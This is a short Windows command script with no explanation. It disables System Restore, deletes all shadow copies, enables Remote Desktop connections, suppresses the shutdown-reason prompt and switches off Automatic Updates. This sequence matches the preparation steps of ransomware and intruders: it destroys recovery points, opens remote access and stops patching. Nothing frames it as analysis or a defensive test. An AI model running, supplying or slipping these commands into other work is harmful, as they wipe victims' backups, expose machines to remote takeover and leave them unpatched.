wmic /namespace:\\root\default path SystemRestore call Disable %SystemDrive%
wmic shadowcopy delete
wmic rdtoggle where ServerName="%COMPUTERNAME%" CALL SetAllowTSConnections 1, 1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Reliability" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Reliability" /v ShutdownReasonOn  /t REG_DWORD /d 0x0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update" /v AUOptions /t REG_DWORD /d 1 /f


